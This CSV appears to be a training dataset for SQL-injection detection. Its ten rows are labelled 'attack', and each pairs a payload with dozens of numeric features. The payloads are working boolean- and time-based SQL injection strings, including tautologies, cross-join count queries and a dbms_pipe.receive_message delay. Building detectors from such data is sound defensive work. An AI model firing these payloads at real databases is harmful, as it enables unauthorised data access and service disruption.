id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_001459,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000016,7.23637660972874,225.26419067382812,87.2197494506836,18.405303955078125,92.42891693115234,0.38637134432792664,35.04088592529297,26.29178237915039,1.136545181274414,0.2447787970304489,0.11918412894010544,0.34117594361305237,0.15669511258602142,3.9076504707336426,-0.0692703127861023,1.1304882764816284,-0.10944180935621262,0.139278382062912,-0.23481488227844238,-0.604738175868988,8.23061466217041,7.480443477630615,1.3380682468414307,0.3914183974266052,1.300276279449463,-0.6840835809707642,0.19673922657966614,0.21761749684810638,2.005600690841675,0.9645563960075378,1.103269100189209,-0.9107091426849365,-0.05557141825556755,-0.3967548906803131,0.3179365396499634,1.1967337131500244,6.9974188804626465,1.1731312274932861,1.1896756887435913,0.3894961178302765,0.5803319215774536,0.845731794834137,0.2742765247821808,0.043828193098306656,0.08909369260072708,0.45591625571250916,0.22232358157634735,0.3423794209957123,0.26233962178230286,0.5044446587562561,0.092428058385849,0.07786429673433304,-0.6474161148071289,0.6104407906532288,-0.28197187185287476,-0.6982632875442505,0.8629980683326721,0.23212765157222748,-1.0072568655014038,-0.6983421444892883,-0.2150004357099533,-0.2803691625595093,0.520510196685791,6.911345958709717,-0.1404678374528885,0.012376769445836544,0.10945113003253937,-0.1124802678823471,-0.2413789927959442,0.6368617415428162,-0.5214722156524658,1.395613431930542,-0.7756431698799133,0.13650193810462952,0.19155439734458923,-0.8155398368835449,1.4671686887741089,0.8648175001144409,-0.5276727080345154,-0.35674208402633667,-0.025677382946014404,10.92788028717041,1.2290726900100708,0.3095245063304901,0.670589029788971,-0.9213672876358032,0.8700823187828064,0.371648371219635,-0.6479232907295227
GAN_001460,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000042,6.763265804376897,255.58787536621094,82.19441986083984,21.654024124145508,89.91018676757812,0.29209059476852417,31.226648330688477,25.76685905456543,1.4515340328216553,0.2669442296028137,0.13444027304649353,0.3177175521850586,0.15431572496891022,4.023966312408447,0.740973174571991,0.7172152996063232,-0.05517464131116867,0.1652311235666275,-0.1726689338684082,-0.7539414763450623,4.601368427276611,6.128976821899414,1.4355732202529907,0.4016953408718109,1.2781391143798828,-0.4856303632259369,-0.07604701071977615,0.1448604166507721,1.9975591897964478,1.1428697109222412,1.2612419128417969,-0.6910789608955383,-0.15335717797279358,-0.3191958963871002,0.4707374572753906,1.1520298719406128,5.924745559692383,0.7162915468215942,1.1892589330673218,0.2037716656923294,0.5288641452789307,0.852448046207428,0.12362063676118851,0.40337470173835754,0.019104499369859695,0.7553018927574158,0.23921522498130798,0.38663724064826965,0.214768648147583,0.47294190526008606,0.10259465873241425,0.14481239020824432,-0.5556771755218506,0.46869081258773804,-0.054551392793655396,-0.4649456739425659,0.7411608695983887,-0.07415098696947098,-0.6091131567955017,-0.659422755241394,-0.4532240033149719,0.40015751123428345,0.3273279368877411,4.412606239318848,0.10979605466127396,-0.022936377674341202,0.05933381989598274,0.2515067458152771,-0.17510394752025604,0.25901687145233154,-0.5342791080474854,1.2373713254928589,-0.9343600869178772,0.09662102907896042,0.4105249047279358,-1.071312665939331,1.4066104888916016,0.7366309762001038,-0.43559861183166504,-0.2611956000328064,0.02230120822787285,9.214035034179688,1.2369134426116943,0.30143213272094727,0.3311898112297058,-0.566571831703186,0.9509999752044678,0.597976565361023,-0.42871057987213135
GAN_001461,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,5.003371580227445,209.4367218017578,78.51249694824219,20.78150749206543,60.41222381591797,0.18304255604743958,55.31277847290039,26.603364944458008,1.0651670694351196,0.3191646337509155,0.13758786022663116,0.33186593651771545,0.15307191014289856,3.9035329818725586,0.7242085337638855,0.7116355299949646,0.37355124950408936,0.07681028544902802,-0.02339956909418106,-0.19500917196273804,6.0365519523620605,5.3557915687561035,1.9863070249557495,0.09052647650241852,1.5666437149047852,-0.41669541597366333,0.10599659383296967,0.14301808178424835,1.508467674255371,0.8545530438423157,0.6410768628120422,-0.5452266931533813,-0.029024187475442886,-0.31833311915397644,0.4205562472343445,1.3219906091690063,5.681708335876465,0.8543104529380798,0.8476464748382568,0.22030030190944672,0.48447850346565247,0.8484717607498169,-0.03295228257775307,0.16592755913734436,-0.16960591077804565,0.329466849565506,0.1793411374092102,0.2709006071090698,0.21562378108501434,0.3036912679672241,0.11550289392471313,0.17694339156150818,-0.2036849707365036,0.35412341356277466,0.13816353678703308,-0.20142409205436707,0.40679705142974854,0.030417995527386665,-0.4634947180747986,-0.3208264708518982,-0.40895524621009827,0.032360680401325226,0.293641597032547,3.358945846557617,-0.06344205141067505,0.03229578584432602,0.07571293413639069,0.3541129231452942,0.01928355172276497,0.15974538028240204,-0.39275434613227844,0.6344372630119324,-0.6389455199241638,0.06306052207946777,-0.0019460618495941162,-0.7434587478637695,1.2243905067443848,0.6479148268699646,-0.2805635333061218,-0.12476804107427597,-0.09351465106010437,7.208794116973877,1.13771653175354,0.06920590996742249,0.29922860860824585,-0.34786728024482727,0.5772067904472351,0.3679710924625397,-0.24225972592830658
GAN_001462,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000073,7.329306647738246,220.22683715820312,93.41622924804688,19.610849380493164,91.06029510498047,0.34791305661201477,20.063915252685547,27.679336547851562,1.2674219608306885,0.2271389365196228,0.10562387108802795,0.3098171353340149,0.1551673412322998,3.906365156173706,0.17523294687271118,1.2299431562423706,-0.1736876219511032,0.14008910953998566,-0.20752203464508057,-0.7651679515838623,6.093775749206543,7.192622184753418,1.2843647003173828,0.6504070162773132,1.3199727535247803,-0.37856778502464294,0.17741703987121582,0.20096278190612793,1.7102662324905396,1.2256649732589722,1.306600570678711,-0.8186836838722229,-0.06899156421422958,-0.4188621938228607,0.28789380192756653,1.3012635707855225,7.089752674102783,0.6925432682037354,1.4765961170196533,0.17261803150177002,0.5863455533981323,0.7917109727859497,0.29715725779533386,0.16440585255622864,0.05156715214252472,0.459906667470932,0.13981835544109344,0.4457550346851349,0.32268545031547546,0.5182110667228699,0.14680179953575134,0.12571358680725098,-0.7154179811477661,0.6632363200187683,-0.09179477393627167,-0.5918669104576111,0.8181688189506531,0.17225602269172668,-0.6989188194274902,-0.5330525040626526,-0.4043334126472473,0.12062624096870422,0.40559548139572144,5.996530055999756,-0.1896965056657791,0.01986664906144142,0.04517924040555954,0.2351965308189392,-0.2019137144088745,0.5147491097450256,-0.2663590610027313,1.2966067790985107,-0.9318211674690247,0.1376015990972519,0.22710593044757843,-1.0788300037384033,1.373590111732483,0.9500582218170166,-0.5510281920433044,-0.31239256262779236,-0.2516186237335205,9.393056869506836,1.2425298690795898,0.1885962337255478,0.3190563917160034,-0.6912299990653992,0.8773022294044495,0.35448265075683594,-0.6158641576766968
GAN_001463,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000029,4.287676668726479,205.04885864257812,72.95808410644531,24.431819915771484,74.96565246582031,0.1465989500284195,42.912330627441406,23.985427856445312,1.206284999847412,0.31195366382598877,0.13772642612457275,0.3480387330055237,0.14779211580753326,3.8374545574188232,1.3548741340637207,0.6683341860771179,0.4646027088165283,0.05564233660697937,0.0023063416592776775,0.02841578982770443,6.025282859802246,5.772683620452881,2.068584680557251,0.053151726722717285,1.6009794473648071,-0.32898154854774475,0.1334456503391266,0.08570732921361923,1.0994962453842163,0.696323812007904,0.3214768171310425,-0.26158803701400757,0.06142435222864151,-0.2639603912830353,0.5319069027900696,1.5266976356506348,5.98325777053833,0.8619993925094604,1.0266457796096802,0.15723899006843567,0.48066744208335876,0.41685906052589417,-0.08059528470039368,0.18001917004585266,-0.03215951472520828,0.10865039378404617,0.16369767487049103,0.11252237856388092,0.13742691278457642,0.1891145557165146,0.1126074269413948,0.11397192627191544,-0.1657620519399643,-0.005989433731883764,-0.02904171496629715,-0.17486511170864105,0.10594673454761505,0.03027760423719883,-0.3214060664176941,-0.17498254776000977,-0.4667837917804718,0.12079443782567978,-0.08154077082872391,3.045644998550415,0.04960884898900986,0.03505644202232361,0.04625321552157402,-0.06303679943084717,-0.12453889846801758,0.10212908685207367,-0.2238704413175583,0.5115160346031189,-0.26229697465896606,0.024063868448138237,0.1949702501296997,-0.31079062819480896,0.8404413461685181,0.6998938918113708,-0.040256399661302567,-0.06957101076841354,0.14405138790607452,9.010636329650879,0.9780508875846863,0.023774851113557816,0.2587205767631531,-0.2599183917045593,0.2307727336883545,0.08593260496854782,-0.21540714800357819
GAN_001464,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000016,6.367193534668074,225.01487731933594,94.40946960449219,21.12135124206543,88.23725891113281,0.22872686386108398,40.954044342041016,28.318252563476562,1.1855952739715576,0.2534969747066498,0.10320977121591568,0.31490394473075867,0.14877308905124664,3.969980239868164,0.742152750492096,0.9957127571105957,-0.13973788917064667,0.10673064738512039,-0.13057926297187805,-0.5969451665878296,8.52621841430664,7.925937175750732,1.5263848304748535,0.4891725182533264,1.4983001947402954,-0.4159918427467346,0.2618878185749054,0.34533435106277466,1.5092942714691162,1.1137140989303589,0.8520562052726746,-0.5906835198402405,-0.12406694144010544,0.014977999031543732,0.45384740829467773,1.2872620820999146,7.572464466094971,0.9670708775520325,1.205474615097046,0.08294101059436798,0.559233546257019,0.6537541747093201,0.2546835243701935,0.18478548526763916,-0.043429695069789886,0.3484770655632019,0.1324950009584427,0.38635724782943726,0.31095102429389954,0.4045659303665161,0.17686094343662262,0.18390177190303802,-0.25530698895454407,0.524479866027832,-0.14425013959407806,-0.4949178993701935,0.6215081214904785,0.12445097416639328,-0.636473536491394,-0.3651666045188904,-0.36168140172958374,-0.21061958372592926,0.24672043323516846,6.2385478019714355,-0.17785325646400452,0.01725786179304123,0.08043377846479416,0.08954104036092758,-0.06568118929862976,0.380893737077713,-0.4472077786922455,1.2125228643417358,-0.46807727217674255,0.11958517879247665,-0.04637369513511658,-0.9345740079879761,1.2192456722259521,0.7477190494537354,-0.36211755871772766,-0.2192922979593277,-0.06806647777557373,9.691778182983398,1.0596199035644531,0.3511745035648346,0.15821534395217896,-0.7526137232780457,0.7054994702339172,0.3324752449989319,-0.4431973099708557
GAN_001465,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000042,5.316518895308631,226.42764282226562,73.04278564453125,20.624353408813477,68.08365631103516,0.27206090092658997,45.64039993286133,22.385658264160156,1.307983636856079,0.31810063123703003,0.12401208281517029,0.32086968421936035,0.1456453502178192,3.926027774810791,0.972020149230957,0.4572007358074188,0.21704037487506866,0.09121795743703842,-0.03815985471010208,-0.22928325831890106,5.166082382202148,5.370005130767822,1.5862407684326172,0.23724916577339172,1.4295121431350708,-0.39727795124053955,0.01853138953447342,0.03804405406117439,1.9834644794464111,0.9661847352981567,0.8637296557426453,-0.5845903158187866,0.03587736561894417,-0.30336976051330566,0.40890878438949585,1.251948356628418,5.78285026550293,0.7951486706733704,0.9648675918579102,0.3707253336906433,0.46260133385658264,0.8578254580497742,-0.03171961382031441,0.26965785026550293,-0.06770234555006027,0.5257034301757812,0.12028858810663223,0.22037576138973236,0.17111773788928986,0.3008142411708832,0.08403553068637848,0.10746360570192337,-0.18800731003284454,0.12560458481311798,-0.10607481002807617,-0.4463326036930084,0.5018004179000854,-0.09758173674345016,-0.44836974143981934,-0.3685661256313324,-0.585921049118042,0.3303643465042114,0.37382516264915466,2.884119987487793,-0.04248267412185669,-0.02080414816737175,0.06155085191130638,0.363067090511322,-0.35894328355789185,0.2062915712594986,-0.31445327401161194,0.7566698789596558,-0.8735186457633972,0.06225594878196716,0.30074018239974976,-0.8577777147293091,1.1990437507629395,0.7402486205101013,-0.21324995160102844,-0.13018743693828583,0.16759765148162842,8.286871910095215,1.2158743143081665,0.06461772322654724,0.23871411383152008,-0.21956732869148254,0.6689296364784241,0.4726393222808838,-0.2222643941640854
GAN_001466,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000042,5.79151679665629,227.05514526367188,77.18756866455078,21.004165649414062,66.16841888427734,0.16016142070293427,39.518001556396484,26.943309783935547,1.0086913108825684,0.25242915749549866,0.12465744465589523,0.3280583322048187,0.14303697645664215,3.922727346420288,1.1871873140335083,0.9248123168945312,0.03603477030992508,0.09811630845069885,-0.1230313703417778,-0.6288496851921082,5.667511463165283,5.564570903778076,1.680411458015442,0.4511255621910095,1.3126672506332397,-0.4767095446586609,-0.06350353360176086,0.26594141125679016,2.089817762374878,1.008039951324463,0.7583956122398376,-0.6760047078132629,-0.06699454039335251,-0.37260666489601135,0.3810475170612335,1.378196120262146,6.351668834686279,0.7644906640052795,1.1327887773513794,0.44890978932380676,0.39299795031547546,0.8225222826004028,0.1651296764612198,0.11659637093544006,-0.15344522893428802,0.6263294219970703,0.24104070663452148,0.2859661281108856,0.19162248075008392,0.3943769037723541,0.06726957857608795,0.07138284295797348,-0.35981833934783936,0.3375106453895569,-0.145586296916008,-0.3609509766101837,0.5398772358894348,0.18451860547065735,-0.5158194303512573,-0.24180997908115387,-0.4923083484172821,0.32261642813682556,0.2947068512439728,3.824707269668579,-0.18176081776618958,-0.002992206020280719,0.04056098684668541,0.047498323023319244,-0.34561464190483093,0.4413594901561737,-0.3666907846927643,1.017809510231018,-0.7712305188179016,0.08755115419626236,0.039400968700647354,-0.8098846673965454,1.2681561708450317,0.6966663599014282,-0.30845004320144653,-0.20817045867443085,-0.17319408059120178,7.542008876800537,1.1558666229248047,0.11840194463729858,0.28166598081588745,-0.3407944440841675,0.4450155198574066,0.46211618185043335,-0.1500791311264038
GAN_001467,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000059,6.357558878967704,248.24661254882812,95.5289535522461,16.422611236572266,73.39527130126953,0.25677356123924255,47.40144729614258,25.112817764282227,1.2441877126693726,0.31343919038772583,0.12182621657848358,0.28536543250083923,0.15602995455265045,4.098505973815918,0.47838860750198364,0.6451168656349182,-0.18488948047161102,0.09779000282287598,-0.10239095240831375,-0.39631935954093933,6.37015438079834,6.035975456237793,2.1480138301849365,0.22443467378616333,1.5291507244110107,-0.6210771799087524,0.23244555294513702,0.08196783810853958,1.5093549489974976,1.1559559106826782,0.9198991656303406,-0.5183064341545105,-0.12874820828437805,-0.22961187362670898,0.4307496249675751,1.0486695766448975,6.849185943603516,0.9619491696357727,1.0479737520217896,0.22359474003314972,0.5703455209732056,0.863433301448822,0.0308951735496521,0.15696489810943604,-0.1937529444694519,0.47577551007270813,0.22724959254264832,0.3861377239227295,0.3312065303325653,0.4032208025455475,0.21860449016094208,0.1927044540643692,-0.24805083870887756,0.7363104224205017,0.17745891213417053,-0.4095885753631592,0.8115599751472473,-0.1358625441789627,-0.562488853931427,-0.4528995752334595,-0.672202467918396,-0.0722445398569107,0.3313588500022888,4.792943954467773,-0.09523677825927734,0.026745442301034927,0.12905822694301605,0.6152182817459106,-0.015412170439958572,0.3714646100997925,-0.7021210789680481,0.9001185297966003,-0.8519794940948486,0.08834251761436462,-0.002224557101726532,-1.2684968709945679,1.2779390811920166,0.7104648947715759,-0.5152337551116943,-0.3205178678035736,-0.10398127138614655,8.99808120727539,1.2287834882736206,0.32515212893486023,0.26947396993637085,-0.6072854995727539,1.0202473402023315,0.5285605192184448,-0.4419454336166382
GAN_001468,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,5.771815914805727,204.84593200683594,81.64460754394531,19.066768646240234,69.79399871826172,0.3721311688423157,40.7482795715332,22.98219871520996,1.2574961185455322,0.31936129927635193,0.1130542978644371,0.3292788863182068,0.1518203616142273,3.8287642002105713,0.5495161414146423,0.8025524616241455,0.25145620107650757,0.09183012694120407,-0.06130363792181015,-0.21829262375831604,6.37006139755249,5.099710464477539,1.6666922569274902,0.28396183252334595,1.4734420776367188,-0.37528568506240845,0.11203870177268982,-0.009876827709376812,1.8673807382583618,1.0186985731124878,0.9010651707649231,-0.7228659987449646,0.03567526862025261,-0.48945295810699463,0.32599976658821106,1.290661334991455,5.951406478881836,0.7509694695472717,1.0322433710098267,0.2577209770679474,0.5724456310272217,0.9037306904792786,0.01317465677857399,0.17698565125465393,-0.06874783337116241,0.3877849876880646,0.17978732287883759,0.25198861956596375,0.25987836718559265,0.3662164509296417,0.11434898525476456,0.1367066353559494,-0.5890800952911377,0.3911009430885315,-0.1356433480978012,-0.39620667695999146,0.5922667980194092,0.016521239653229713,-0.625359296798706,-0.5921192765235901,-0.546763002872467,0.10626515746116638,0.46136754751205444,3.538872480392456,-0.06340371072292328,0.012226811610162258,0.06157924234867096,0.2758432626724243,-0.2068788707256317,0.2649599313735962,-0.4249224066734314,0.8166460394859314,-0.8464704155921936,0.09005381166934967,0.2492872029542923,-0.9057072401046753,1.2910137176513672,0.7758220434188843,-0.3275054097175598,-0.18563811480998993,0.010562533512711525,8.424715995788574,1.266654133796692,0.062353480607271194,0.4809421896934509,-0.48916101455688477,0.728674054145813,0.39066174626350403,-0.41963738203048706
